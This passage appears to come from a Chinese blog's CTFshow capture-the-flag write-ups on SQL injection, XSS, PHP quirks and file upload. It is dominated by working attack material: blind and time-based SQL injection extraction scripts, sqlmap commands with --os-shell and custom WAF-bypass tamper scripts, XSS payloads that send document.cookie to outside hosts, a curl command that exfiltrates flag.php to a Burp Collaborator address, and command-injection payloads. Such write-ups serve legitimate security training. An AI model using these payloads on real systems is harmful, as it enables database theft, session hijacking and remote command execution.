r\"{flqazwsxedcrvtgbyhnujmikolp-0123456789}_,\"\nflag=''\nfor i in range(1,1000):\n\tfor j in flagstr:\n\t\ttmp=flag+j\n\t\tdata = {'username': f\"admin' and if(((select group_concat(f1ag) from ctfshow_flxg)regexp('{tmp}')),1,0)#\",'password': '1',}\n\t\ttex = requests.post(url=url, data=data)\n\t\tif \"用户名不存在\" not in tex.json()['msg']:\n\t\t\tprint(j,end='')\n\t\t\tflag=flag+j\n\t\t\tbreak\n```\n\n**195**\n\n堆叠改密码咯，查询语句中的username没有用引号包裹，所以查询的时候用十六进制转字符串\n\n```\n1;update`ctfshow_user`set`pass`=0x313131;\n1\n0x61646d696e\n111\n```\n\n**196**\n\n😅\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-10 11.29.32.png)\n\n**197，198**\n\n一个wp脚本\n\n```python\n# @Author:Y4tacker\nimport requests\n\nurl = \"http://b126bc7c-2b32-461d-9520-30d5baf7a152.chall.ctf.show/api/\"\nfor i in range(100):\n    if i == 0:\n        data = {\n            'username': '0;alter table ctfshow_user change column `pass` `ppp` varchar(255);alter table ctfshow_user '\n                        'change column `id` `pass` varchar(255);alter table ctfshow_user change column `ppp` `id` '\n                        'varchar(255);',\n            'password': f'{i}'\n        }\n        r = requests.post(url, data=data)\n    data = {\n        'username': '0x61646d696e',\n        'password': f'{i}'\n    }\n    r = requests.post(url, data=data)\n    if \"登陆成功\" in r.json()['msg']:\n        print(r.json()['msg'])\n        break\n```\n\n我选离谱方法：\n\n```\n# @Author:Y4tacker\n# username=0;show tables;\n# pass=ctfshow_user\n```\n\n**199，200**\n\n只有离谱方法能用了\n\n**201**\n\nsqlmap使用开始\n\n```\n//查库\nsqlmap -u \"http://212b52c9-db7a-4a4b-9b07-d23bb1989fc5.challenge.ctf.show/api/?id=1\" --referer=\"ctf.show\" --dbs\n//查表\nsqlmap -u \"http://212b52c9-db7a-4a4b-9b07-d23bb1989fc5.challenge.ctf.show/api/?id=1\" --referer=\"ctf.show\" -D ctfshow_web --tables\n//查字段 \nsqlmap -u \"http://212b52c9-db7a-4a4b-9b07-d23bb1989fc5.challenge.ctf.show/api/?id=1\" --referer=\"ctf.show\" -D ctfshow_web -T ctfshow_user --columns\n//查值\nsqlmap -u \"http://212b52c9-db7a-4a4b-9b07-d23bb1989fc5.challenge.ctf.show/api/?id=1\" --referer=\"ctf.show\" -D ctfshow_web -T ctfshow_user -C id,pass,username --dump\n```\n\n**202**\n\n使用POST请求，添加--data参数来设置\n\n```\nsqlmap -u http://84e4c090-49b9-47dd-a749-2b144bba6ff5.challenge.ctf.show/api/ --data=\"id=1\" --referer=\"ctf.show\" -D ctfshow_web -T ctfshow_user -C pass --dump\n```\n\n**203**\n\n调整请求方式，此处调整为PUT请求，记得加上Content-Type不然会变表单提交\n\n```\nsqlmap -u http://86418dcd-b385-474c-b132-554a8ee6a95d.challenge.ctf.show/api/index.php --referer=\"ctf.show\" --data=\"id=1\" --method=\"PUT\" --headers=\"Content-Type:text/plain\" -D ctfshow_web -T ctfshow_user -C pass --dump\n```\n\n**204**\n\n加上cookie，用--cookie\n\n```\nsqlmap -u http://024304b8-be6a-48da-bc31-a8fcb796f2e8.challenge.ctf.show/api/index.php --cookie=\"UM_distinctid=17ff4d2091576a-09cf5f45e352f9-113f645d-384000-17ff4d209161689; PHPSESSID=honuvgjau5711m3j9tn84hloip; ctfshow=2e0d6ee1573392a73c0cca1476342faa\" --referer=\"ctf.show\" --data=\"id=1\" --method=\"PUT\" --headers=\"Content-Type:text/plain\" -D ctfshow_web -T ctfshow_user -C pass --dump\n```\n\n**205**\n\n提示api鉴权，发现请求前会先对一个url进行调用\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-10 21.53.17.png)\n\n使用如下两个参数\n\n```\n--safe-url 设置在测试目标地址前访问的安全链接\n--safe-freq 设置两次注入测试前访问安全链接的次数\n```\n\n最终命令~~悄悄换表名和列名真的可恶~~\n\n```\nsqlmap -u http://685993ca-1d7f-4372-b50e-2bfc278ae33e.challenge.ctf.show/api/index.php --safe-url=\"http://685993ca-1d7f-4372-b50e-2bfc278ae33e.challenge.ctf.show/api/getToken.php\" --safe-freq=1 --referer=\"ctf.show\" --data=\"id=1\" --method=\"PUT\" --headers=\"Content-Type:text/plain\" -D ctfshow_web -T ctfshow_flaxc -C flagv --dump\n```\n\n**206**\n\n提示SQL需要闭合，~~当我sqlmap傻是吧~~，同上即可\n\n**207**\n\n--tamper 的初体验\n\n[tamper总结](https://blog.csdn.net/whatday/article/details/54774043)\n\n使用SQLMap提供的tamper脚本，可在一定程度上避开应用程序的敏感字符过滤、绕过WAF规则的阻挡，继而进行渗透攻击，--tamper=TAMPER 利用给定的脚本进行篡改注入数据，该题过滤了空格，使用自带的space2comment.py即可绕过\n\n```\nsqlmap -u http://894488fd-6cfa-4392-aefa-61f64467a37c.challenge.ctf.show/api/index.php --safe-url=\"http://894488fd-6cfa-4392-aefa-61f64467a37c.challenge.ctf.show/api/getToken.php\" --safe-freq=1 --referer=\"ctf.show\" --data=\"id=1\" --method=\"PUT\" --headers=\"Content-Type:text/plain\" -D ctfshow_web -T ctfshow_flaxca -C flagvc --dump --tamper=\"space2comment.py\"\n```\n\n**208**\n\n过滤了小写的select，但是sqlmap中所有SELECT都是大写，同上即可\n\n```\nsqlmap -u http://d6087ca0-43f5-417e-8fe2-b620a9fda955.challenge.ctf.show/api/index.php --safe-url=\"http://d6087ca0-43f5-417e-8fe2-b620a9fda955.challenge.ctf.show/api/getToken.php\" --safe-freq=1 --referer=\"ctf.show\" --data=\"id=1\" --method=\"PUT\" --headers=\"Content-Type:text/plain\" -D ctfshow_web -T ctfshow_flaxcac -C flagvca --dump --tamper=\"space2comment.py\"\n```\n\n**209**\n\n过滤了空格，*和=，讲道理使用bluecoat.py就行，但是出不来，只能自己编写脚本替换了，将空格用%09替换，=用LIKE替换\n\n```\nsqlmap -u http://477c2806-7230-462f-adac-0213ba40f10f.challenge.ctf.show/api/index.php --data=\"id=1\" --refer=\"ctf.show\" --method=\"PUT\" --headers=\"Content-Type:text/plain\" --safe-url=\"http://477c2806-7230-462f-adac-0213ba40f10f.challenge.ctf.show/api/getToken.php\" --safe-freq=1 -D ctfshow_web -T ctfshow_flav -C ctfshow_flagx,id,tes --dump --batch --tamper web209.py\n```\n\n```python\n#web209.py\n#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2021 sqlmap developers (http://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.compat import xrange\nfrom lib.core.enums import PRIORITY\n\n__priority__ = PRIORITY.LOW\n\ndef dependencies():\n    pass\n\ndef tamper(payload, **kwargs):\n\n    retVal = payload\n\n    if payload:\n        retVal = \"\"\n        quote, doublequote, firstspace = False, False, False\n\n        for i in xrange(len(payload)):\n            if not firstspace:\n                if payload[i].isspace():\n                    firstspace = True\n                    retVal += chr(0x9)\n                    continue\n\n            elif payload[i] == '\\'':\n                quote = not quote\n\n            elif payload[i] == '\"':\n                doublequote = not doublequote\n\n            elif payload[i] == '=':\n                retVal += chr(0x9) + 'like' + chr(0x9)\n                continue\n\n            elif payload[i] == \" \" and not doublequote and not quote:\n                retVal += chr(0x9)\n                continue\n\n            retVal += payload[i]\n\n    return retVal\n\n```\n\n**210**\n\n对字符串进行base64解码反转再解码，那就编码反转再编码\n\n```\nsqlmap -u http://557cc437-11cc-423f-908a-43fd7aa8b33e.challenge.ctf.show/api/index.php --data=\"id=1\" --refer=\"ctf.show\" --method=\"PUT\" --headers=\"Content-Type:text/plain\" --safe-url=\"http://557cc437-11cc-423f-908a-43fd7aa8b33e.challenge.ctf.show/api/getToken.php\" --safe-freq=1 -D ctfshow_web -T ctfshow_flavi -C ctfshow_flagxx --dump --batch --tamper web210.py\n```\n\n```python\n#web210.py\n#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2021 sqlmap developers (http://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.compat import xrange\nfrom lib.core.enums import PRIORITY\nimport base64\n\n__priority__ = PRIORITY.LOW\n\ndef dependencies():\n    pass\n\ndef tamper(payload, **kwargs):\n\n\n    retVal = payload\n\n    if payload:\n        retVal=retVal.encode()\n        retVal=retVal[::-1]\n        retVal=base64.b64encode(retVal)\n        retVal=retVal[::-1]\n        retVal=base64.b64encode(retVal)\n    return retVal.decode()\n```\n\n**211**\n\n相比于上题多过滤了空格，加上space2commit脚本即可\n\n```\nsqlmap -u http://5202066d-7531-4be8-8cff-4ae5052a88a4.challenge.ctf.show/api/index.php --data=\"id=1\" --refer=\"ctf.show\" --method=\"PUT\" --headers=\"Content-Type:text/plain\" --safe-url=\"http://5202066d-7531-4be8-8cff-4ae5052a88a4.challenge.ctf.show/api/getToken.php\" --safe-freq=1 -D ctfshow_web --tables --dump --batch --tamper=\"space2commit.py,web210.py\"\n```\n\n**212**\n\n前两个加起来\n\n```\nsqlmap -u http://fea29546-5555-4d19-a7fa-63d86e7eb6b8.challenge.ctf.show/api/index.php --data=\"id=1\" --refer=\"ctf.show\" --method=\"PUT\" --headers=\"Content-Type:text/plain\" --safe-url=\"http://fea29546-5555-4d19-a7fa-63d86e7eb6b8.challenge.ctf.show/api/getToken.php\" --safe-freq=1 -D ctfshow_web --tables --dump --batch --tamper=\"web209.py,web210.py\"\n```\n\n**213**\n\n一键getshell，--os-shell\n\n```\nsqlmap -u http://18f74fd7-e863-4171-a825-d896a079c1f3.challenge.ctf.show/api/index.php --data=\"id=1\" --refer=\"ctf.show\" --method=\"PUT\" --headers=\"Content-Type:text/plain\" --safe-url=\"http://18f74fd7-e863-4171-a825-d896a079c1f3.challenge.ctf.show/api/getToken.php\" --safe-freq=1 -D ctfshow_web --tables --os-shell --dump --batch --tamper=\"web209.py,web210.py\"\n```\n\n**214**\n\n时间盲注开始\n\n首页发现网络流量中有select.js，查看代码\n\n```javascript\n\nlayui.use('element', function(){\n  var element = layui.element;\n  element.on('tab(nav)', function(data){\n    console.log(data);\n  });\n});\n\n$.ajax({\n      url:'api/',\n      dataType:\"json\",\n      type:'post',\n      data:{\n        ip:returnCitySN[\"cip\"],\n        debug:0\n      }\n\n    });\n```\n\n发现提交的表单中有两个变量，测试一下\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-12 14.27.34.png)\n\n测试成功，开始编写代码\n\n```python\nimport requests\n\nurl=\"http://7a5edb92-03ea-49ff-bd27-30b753229c99.challenge.ctf.show/api/\"\nflagchar=\"-{},qwertyuiopasdfghjklzxcvbnm_1234567890\"\n\nfor i in range(1,1000):\n\tfor j in flagchar:\n\t\tdata = {\n\t\t\t#'ip': f'1 or if((substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\"ctfshow_flagx\"),{i},1))=\"{j}\",sleep(3),1)',\n\t\t\t'ip': f'1 or if((substr((select group_concat(flaga) from ctfshow_flagx),{i},1))=\"{j}\",sleep(3),1)',\n\t\t\t'debug': '1'\n\t\t}\n\t\ttry:\n\t\t\trequests.post(url=url,data=data,timeout=2.5)\n\t\texcept:\n\t\t\tprint(j,end='')\n\t\t\tbreak\n```\n\n**215**\n\n单引号闭合\n\n```python\nimport requests\n\nurl=\"http://59e08013-c379-4607-a6bf-c11d5c4d6d6e.challenge.ctf.show/api/\"\nflagchar=\"-{},flagqwertyuiopsdhjkzxcvbnm_1234567890\"\n\nfor i in range(1,1000):\n\tfor j in flagchar:\n\t\tdata = {\n\t\t\t#'ip': f'1\\' or if((substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))=\"{j}\",sleep(3),1)#',\n\t\t\t#'ip': f'1\\' or if((substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\"ctfshow_flagxc\"),{i},1))=\"{j}\",sleep(3),1)#',\n\t\t\t'ip': f'1\\' or if((substr((select group_concat(flagaa) from ctfshow_flagx),{i},1))=\"{j}\",sleep(3),1)#',\n\t\t\t'debug': '1'\n\t\t}\n\t\ttry:\n\t\t\trequests.post(url=url,data=data,timeout=2.5)\n\t\texcept:\n\t\t\tprint(j,end='')\n\t\t\tbreak\n```\n\n**216**\n\nbase64编码\n\n```python\nimport requests\n\nurl=\"http://fe2f1a17-e483-4137-b85d-9fa3a6daaa18.challenge.ctf.show/api/\"\nflagchar=\"-{},ctfshowlagbde1234567890\"\nnamechar=\",ctfshow_qwertyuiopasdfghjklzxcvbnm\"\nfor i in range(1,1000):\n\tfor j in flagchar:\n\t\tdata = {\n\t\t\t#'ip': f'\"MQ==\") or if((substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))=\"{j}\",sleep(2),1)#',\n\t\t\t#'ip': f'\"MQ==\") or if((substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\"ctfshow_flagxcc\"),{i},1))=\"{j}\",sleep(2),1)#',\n\t\t\t'ip': f'\"MQ==\") or if((substr((select group_concat(flagaac) from ctfshow_flagxcc),{i},1))=\"{j}\",sleep(2),1)#',\n\t\t\t'debug': '1'\n\t\t}\n\t\ttry:\n\t\t\trequests.post(url=url,data=data,timeout=1.5)\n\t\texcept:\n\t\t\tprint(j,end='')\n\t\t\tbreak\n```\n\n**217**\n\nsleep不能用了啦，都ctfshow害得啦，拜托，换benchmark\n\n```\nimport requests\n\nurl = \"http://e7d85700-c8a1-48c2-bea8-4ead2e0976b4.challenge.ctf.show/api/\"\nflagchar = \"-{},ctfshowlagbde1234567890\"\nnamechar = \",ctfshow_qwertyuiopasdfghjklzxcvbnm\"\nfor i in range(1, 1000):\n    for j in flagchar:\n        data = {\n            #'ip': f'1) or if(((substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))=\\'{j}\\'),(benchmark(20000000,sha(1))),1)#',\n            #'ip': f'1) or if(((substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\"ctfshow_flagxccb\"),{i},1))=\\'{j}\\'),(benchmark(20000000,sha(1))),1)#',\n            'ip': f'1) or if(((substr((select group_concat(flagaabc) from ctfshow_flagxccb),{i},1))=\\'{j}\\'),(benchmark(20000000,sha(1))),1)#',\n            'debug': '1'\n        }\n        try:\n            requests.post(url=url, data=data, timeout=4)\n        except:\n            print(j, end='')\n            break\n\n```\n\n**218**\n\nbenchmark也🈚️了，换笛卡尔积\n\n```python\nimport requests\n\nurl = \"http://de5b41b6-9f89-4e0a-b913-7c33a143979a.challenge.ctf.show/api/\"\nflagchar = \"-{},abcdef1234567890\"\nnamechar = \",ctfshow_qwertyuiopasdfghjklzxcvbnm\"\nfor k in range(10):\n    print()\n    for i in range(1, 50):\n        for j in flagchar:\n            data = {\n                #'ip': f'1) or if(((substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))=\\'{j}\\'),(SELECT count(*) FROM information_schema.columns A,information_schema.columns B),1)#',\n                #'ip': f'1) or if(((substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\"ctfshow_flagxc\"),{i},1))=\\'{j}\\'),(benchmark(20000000,sha(1))),1)#',\n                'ip': f'1) or if(((substr((select group_concat(flagaac) from ctfshow_flagxc),{i},1))=\\'{j}\\'),(SELECT count(*) FROM information_schema.tables A,information_schema.tables B,information_schema.columns C),1)#',\n                'debug': '1'\n            }\n            try:\n                requests.post(url=url, data=data, timeout=4)\n            except:\n                print(j,end=\"\")\n                break\n\n```\n\n**219**\n\n过滤了rlike，笛卡尔积依然可用，同上即可\n\n**220**\n\nsleep|benchmark|rlike|ascii|hex|concat_ws|concat|mid|substr\n\n真能滤，换left\n\n```\nimport requests\n\nurl = \"http://ee633dfd-4a05-4685-bbf6-1da4b5fc4d1d.challenge.ctf.show/api/\"\nflagchar = \"ctfshow-{},abde1234567890\"\nnamechar = \"flag,ctfshow_qwertyuiopasdfghjklzxcvbnm\"\nflag=\"\"\nfor k in range(10):\n    print()\n    flag = \"\"\n    for i in range(1, 50):\n        for j in flagchar:\n            tmp=flag+j\n            data = {\n                'ip': f'1) or if((left((select flagaabcc from ctfshow_flagxcac),{i})=\\'{tmp}\\'),(SELECT count(*) FROM information_schema.tables A,information_schema.tables B,information_schema.columns C),1)#',\n                'debug': '1'\n            }\n            try:\n                requests.post(url=url, data=data, timeout=4)\n            except:\n                flag=tmp\n                print(j,end=\"\")\n                break\n```\n\n时间盲注，结束\n"},{"title":"CTFshowXSS","url":"/posts/36544.html","content":"\n首先自己搭建或者找[xss测试平台](https://xss8.cc/login/)还有[另一个](https://xss.pt/)\n\n**316**\n\n```\n最简单的：\n<script>document.location.href='http://服务器IP/?x='document.cookie</script>\n```\n\n**317**\n\n过滤了script\n\n```\n<body onload=\"document.location.href='http://服务器IP/?x='+document.cookie\"></body>\n```\n\n**318**\n\n过滤了img，使用iframe\n\n```\n<iframe WIDTH=0 HEIGHT=0 srcdoc=。。。。。。。。。。&#60;&#115;&#67;&#82;&#105;&#80;&#116;&#32;&#115;&#82;&#67;&#61;&#34;&#104;&#116;&#116;&#112;&#58;&#47;&#47;&#48;&#120;&#46;&#97;&#120;&#47;&#107;&#48;&#74;&#106;&#34;&#62;&#60;&#47;&#115;&#67;&#114;&#73;&#112;&#84;&#62;>\n<BODY\tONLOAD=document.location='http://xss.darkflow.top?cookie='+document.cookie;>\n```\n\n**319**\n\n同上即可\n\n**320**\n\n过滤了空格，script，用tab\n\n```\n<iframe\tWIDTH=0\tHEIGHT=0\tsrcdoc=。。。。。。。。。。&#60;&#115;&#67;&#82;&#105;&#80;&#116;&#32;&#115;&#82;&#67;&#61;&#34;&#104;&#116;&#116;&#112;&#58;&#47;&#47;&#48;&#120;&#46;&#97;&#120;&#47;&#107;&#48;&#74;&#106;&#34;&#62;&#60;&#47;&#115;&#67;&#114;&#73;&#112;&#84;&#62;>\n```\n\n**321**\n\n过滤了img，同上\n\n**322**\n\n同上\n\n**323**\n\n过滤了iframe，使用body onload（艹居然过滤了xss，我的域名里有xss啊啊啊啊啊啊啊啊啊啊啊）\n\n```\n<body/onload=document.location='http://20.231.29.154:5000/?cookie='+document.cookie;>\n```\n\n一直到326通杀\n\n浅总结：看这几道题来说，反射性xss无非就是变换标签，结合各种编码去绕过，空格用`\\`，关键字双写或者编码等等\n\n\n\n存储型XSS开始\n\n**327**\n\n收件人为admin，内容为XSS即可\n\n```\n<body/onload=document.location='http://20.231.29.154:5000/?cookie='+document.cookie;>\n```\n\n**328**\n\n构造js偷管理员cookie（不知道为啥我偷了登陆了也不行）\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-20 17.41.19.png)\n\n用超强模块吧\n\n```\n<sCRiPt sRC=//xss8.cc/R9YM></sCrIpT>\n```\n"},{"title":"CTFshowPHP特性","url":"/posts/47427.html","content":"\n**89**\n\n数组绕过\n\n```\nintval()用于获取变量的整数值\nintval() 函数通过使用指定的进制base转换（默认是十进制），返回变量var的integer数值。intval()不能用于object，否则会产生E_NOTICE错误并返回1。\n语法\nint intval ( mixed $var [, int $base = 10 ] )\n```\n\n**90**\n\n十六进制\n\n**91**\n\n```\nif(preg_match('/^php$/im', $a)){\n    if(preg_match('/^php$/i', $a)){\n        echo 'hacker';\n    }\n//m代表多行匹配，换行符加php即可\n//cmd=%0Aphp\n```\n\n**92**\n\n同90\n\n**93**\n\n滤了16进制，使用8进制绕过\n\n```\n?num=010574\n```\n\n**94**\n\n全等用小数绕过\n\n```\n?num=4476.01\n```\n\n**95**\n\n小数点没了，用八进制加正号绕过0过滤\n\n```\n?num=+010574\n```\n\n**96**\n\n```\n?u=./flag.php\n```\n\n**97**\n\nmd5强相等数组绕过\n\n```\na[]=1&b[]=2\n```\n\n**98**\n\n分析代码\n\n```\n3.\t$_GET?$_GET=&$_POST:'flag';\n\n    if ($_GET) {\t\t\t//只要有输入的get参数\n        $_GET = &$_POST; //就将get方法改变为post方法(修改了get方法的地址)\n        \t\t\t\t// 比如$_GET[a] = &$_POST[a]，get传a无作用，必须用POST\n    } else {\n        \"flag\";\n    }\n\n4、5行无作用\n\n6.\thighlight_file($_GET['HTTP_FLAG']=='flag'?$flag:__FILE__);\n\n    if ($_GET['HTTP_FLAG'] == 'flag') { //需要满足这个条件就可以输出flag\n        highlight_file($flag);\t\t\t//因为没有ctfshow{xxxxx}这个文件，所以会产生报错\n        \t\t\t\t\t\t\t\t//进而我们可以看到flag内容\n    } else {\n        highlight_file(__FILE__);\n    }\n构造POST\nHTTP_FLAG=flag\n再添加任意get参数即可\n```\n\n**99**\n\n```\nin_array函数如果不设置strict参数为真则进行若比较，1.php==1\npayload：n=1.php\nPOST\ncontent=一句话木马\n```\n\n**100**\n\n在PHP中，=赋值运算符优先级高于and，所以语句执行是v0=is_numeric(v1)，传入v1为数字即可\n\n```\n?v1=1&v2=var_dump($ctfshow)&v3=;\n```\n\n**101**\n\n反射类\n\n```php\n顾名思义，就是一个类的反射（废话么不是）\n下面是例子\nclass fuc { //定义一个类\n static\n function ec() {\n  echo '我是一个类';\n }\n}\n$class=new ReflectionClass('fuc'); //建立 fuc这个类的反射类\n$fuc=$class->newInstance(); //相当于实例化 fuc 类\n$fuc->ec(); //执行 fuc 里的方法ec\n$ec=$class->getmethod('ec'); //获取fuc 类中的ec方法\n$fuc=$class->newInstance(); //实例化\n$ec->invoke($fuc);   //执行ec 方法\n```\n\n**102**\n\n```\n先转base64再转16进制完成绕过\n```\n\n**103**\n\n同上\n\n**104**\n\n没验证直接传俩一样的呗\n\n**105**\n\n```PHP\nforeach($_GET as $key => $value){\n    if($key==='error'){\n        die(\"what are you doing?!\");\n    }\n    $$key=$$value;\n}foreach($_POST as $key => $value){\n    if($value==='flag'){\n        die(\"what are you doing?!\");\n    }\n    $$key=$$value;\n}\n多种操作方法\n通过die($error)输出\npayload:a=flag \nPOST: error=a\n进行的操作为\n$a=$flag;\n$error=$a;\n\n此时$a=flag{test123};$error=flag{test123};从而输出error也就是输出flag\n通过die($suces)\npayload:suces=flag&flag=\n进行的操作为\n$suces=$flag;\n\n```\n\n**106**\n\n构造数组或弱相等绕过\n\n```\naaroZmOk\naaK1STfY\naaO8zKZF\naa3OFF9m\n```\n\n**107**\n\n```php\nparse_str函数，将字符串解析成多个变量\n$a=\"x=1&y=2\";\nparse_str($a,$b);\n此时$b['x']为1，$b['y']为2\n\npaylaod:?v3=1\nPOST\nv1=flag=c4ca4238a0b923820dcc509a6f75849b\n```\n\n**108**\n\n正则表达式%00截断，正则表达式只会匹配%00之前的内容\n\n```\nstrrev()//反转字符串\nintval()//取整数\npayload:?c=a%00778\n```\n\n**109**\n\n```php\neval(\"echo new $v1($v2());\");\n//构造使得v1名称的类存在后面任意构造即可\n```\n\n**110**\n\n```PHP\nFilesystemIterator类的使用\n$a=new FilesystemIterator(getcwd());\nwhile($a->valid()){\n  echo $a->getFilename().\"\\n\";\n  $a->next();\n}\n迭代输出当前目录下的内容\ngetcwd()//取得当前工作目录\n```\n\n**111**\n\nv1要在正则中等于ctfshow，执行的语句就是\n\n```\n$ctfshow=&$(v2的值);\nvar_dump($ctfshow);\n相当于执行了\nvar_dump($(v2的值));\n令v2=GLOBALS超全局变量即可将所有变量打印\npayload:?v1=ctfshow&v2=GLOBALS\n```\n\n**112**\n\n```\nURL二次编码，题目中把base64滤过了，对b进行二次URL编码即可，传入php时进行一次解码，调用php伪协议时再有一次\n```\n\n**113**\n\n压缩流读取\n\n```\npayload:?file=compress.zlib:///var/www/html/flag.php\n```\n\n**114**\n\n```\nphp://filter\n```\n\n**115**\n\n在数字前加上空格，也会被is_numeric函数认为是数字\n\ntrim函数会过滤空格以及`\\n\\r\\t\\v\\0`，但不会过滤`\\f`\n\n最终payload:urlencode(\"\\f\".36)\n\n**123**\n\n```\nPHP变量名应该只有数字字母下划线,同时GET或POST方式传进去的变量名,会自动将空格，+，.，[转换为_，但是当有特殊字符[时，后面的内容中就不会替换了\npayload:\nPOST:\nCTF_SHOW=1&CTF[SHOW.COM=1&fun=echo $flag\n```\n\n**125**\n\n```\nCTF_SHOW=1&CTF[SHOW.COM=1&fun=var_export(get_defined_vars())\nCTF_SHOW=1&CTF[SHOW.COM=1&fun=highlight_file($_GET[1])\n?1=flag.php\n```\n\n**126**\n\n```\n1、cli模式（命令行）下\n第一个参数$_SERVER['argv'][0]是脚本名，其余的是传递给脚本的参数\n2、web网页模式下\n在web页模式下必须在php.ini开启register_argc_argv配置项\n设置register_argc_argv = On(默认是Off)，重启服务，$_SERVER[‘argv’]才会有效果\n这时候的$_SERVER[‘argv’][0] = $_SERVER[‘QUERY_STRING’]//这里的这个参数就是GET请求中?后的内容\n$argv,$argc在web模式下不适用\n```\n\n```\npayload:?$fl0g=flag_give_me;\nCTF_SHOW=1&CTF[SHOW.COM=1&fun=eval($a[0])\n```\n\n**127**\n\n前面的自动转换咯\n\n**128**\n\n```\n小知识点： _()是一个函数\n_()==gettext() 是gettext()的拓展函数，开启text扩展。需要php扩展目录下有php_gettext.dll\nget_defined_vars()函数\nget_defined_vars — 返回由所有已定义变量所组成的数组 这样可以获得 $flag\npayload: ?f1=_&f2=get_defined_vars\n```\n\n**129**\n\n目录穿越\n\n```\npayload:?f=/ctfshow/../../../../var/www/html/flag.php \n```\n\n**130**\n\n正则/.+?ctfshow/is\n\nstripos($f, 'ctfshow') === FALSE\n\nstripos返回位置从0开始，未查找到才返回false，在严格相等中不相等\n\n直接绕\n\nf=ctfshow\n\n**131**\n\n[正则溢出](https://www.laruence.com/2010/06/08/1579.html)\n\n传个超过一百万长度的字符就好啦\n\n```\nf='kkkk'*250000+'36Dctfshow'\n#python真好用\n```\n\n**132**\n\nrobots.txt进admin\n\n对于“与”（&&） 运算： x && y 当x为false时，直接跳过，不执行y；\n\n对于“或”（||） 运算 ： x||y 当x为true时，直接跳过，不执行y。\n\n在判断这个的时候if($code === mt_rand(1,0x36D) && $password === $flag || $username ===\"admin\") 第一个$code === mt_rand(1,0x36D)为false,之后就执行|| $username ===\"admin\"\n\n后面有或，所以满足username==='admin'即可\n\n```\npayload:/admin/?code=admin&password=&username=admin\n```\n\n**133**\n\n[骚操作](https://blog.csdn.net/qq_46091464/article/details/109095382)\n\n```\n我们传递?F=`$F`;+sleep 3好像网站确实sleep了一会说明的确执行了命令\n**那为什么会这样？**\n因为是我们传递的`$F`;+sleep 3。先进行substr()函数截断然后去执行eval()函数\n这个函数的作用是执行php代码，``是shell_exec()函数的缩写，然后就去命令执行。\n而$F就是我们输入的`$F`;+sleep 3 使用最后执行的代码应该是\n`$F`;\n$F变量内容就是我们最终执行的内容\n```\n\n使用一把burp自带的功能，Burp Collaborator，相较于DNSLog的好处就是可以带出POST信息，也可以携带Cookie\n\n还有curl命令的使用\n\n```\npayload:?F=`$F`;+curl -X POST -F xx=@flag.php  http://whhi73p89wxl0oghis6zcslnue04ot.burpcollaborator.net\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-09 15.18.07.png)\n\n**134**\n\nphp变量覆盖 利用点是 extract($_POST); 进行解析$_POST数组。 先将GET方法请求的解析成变量，然后在利用extract() 函数从数组中将变量导入到当前的符号表。\n\n```\npayload: ?_POST[key1]=36d&_POST[key2]=36d\n```\n\n**135**\n\n同之前或者直接mv改名\n\n```\npayload:?F=`$F`;+mv flag.php flag.txt;\n```\n\n**136**\n\nban了一堆命令，需要回显，使用Linux tee命令\n\nTee是Linux命令，用于显示程序的输出并将其复制到一个文件中。\n\n```\n命令|tee 输出文件\n```\n\n```\npayload:?c=tac /f149_15_h3r3|tee 1\n查看/1文件即可\n```\n\n**137**\n\ncall_user_func()来调用一个类里面的方法时，使用::如class::function\n\n```\npayload:\nPOST\nctfshow=ctfshow::getFlag\n```\n\n**138**\n\n调用还能传数组\n\n```\npayload:\nPOST\nctfshow[]=ctfshow&ctfshow[]=getFlag\n```\n\n**139**\n\n自动跳转我谢谢你啊\n\n我是真妹想到这玩意还能盲注\n\n```\nimport requests\nimport time\nimport string\nstr=string.digits+string.ascii_lowercase+\"-\"#获取小写字母与数字\nresult=\"\"\nkey=0\nfor j in range(1,45):\n\tprint(j)\n\tif key==1:\n\t\tbreak\n\tfor n in str:\n\t\tpayload=\"if [ `cat /f149_15_h3r3|cut -c {0}` == {1} ];then sleep 3;fi\".format(j,n)\n\t\t#print(payload)\n\t\turl=\"http://13f3a3cd-22e6-4922-a7eb-431f62263a4f.challenge.ctf.show/?c=\"+payload\n\t\ttry:\n\t\t\trequests.get(url,timeout=(2.5,2.5))\t#time()第一个参数是响应时间，第二个是读取时间\n\t\texcept:\n\t\t    result=result+n\n\t\t    print(result)\n\t\t    break\n```\n\n**140**\n\nintval把字符串转成0，0=='字符串'结果为真\n\n找俩函数返回值为字符串就行\n\n```\npayload:\nPOST\nf1=md5&f2=phpinfo\n```\n\n**141**\n\n[绕过无字母数字方法](https://blog.csdn.net/miuzzx/article/details/109143413)\n\n使用取反法\n\n```\npayload：\n?v1=1&v3=-(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5);-&v2=1\n```\n\n**142**\n\n各种进制取零就行\n\n**143**\n\n过滤了取反字符，\n"},{"title":"CTFShow文件上传","url":"/posts/2824.html","content":"\n# 文件上传\n\n\n\n\n\n\n\n\n\n\n\n\n\n**151**\n\n前端校验，直接绕过\n\n**152**\n\nContent/Type校验，直接绕过\n\n**153**\n\n文件后缀名校验，尝试使用php5,phtml等文件失败，康康wp学习新知识，查看响应 